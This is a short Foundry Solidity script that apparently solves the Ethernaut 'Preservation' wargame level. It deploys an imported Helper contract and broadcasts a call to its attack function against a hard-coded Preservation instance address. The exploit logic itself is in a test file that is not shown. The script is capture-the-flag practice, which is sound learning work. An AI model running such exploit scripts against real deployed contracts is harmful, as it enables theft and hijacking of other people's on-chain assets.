// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Helper, Preservation} from "../../test/Ethernaut/Preservation.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.attack(Preservation(0x3Ac98969f343C75cEb8c09801474bf2e4AbDeEB3));
        vm.stopBroadcast();
    }
}
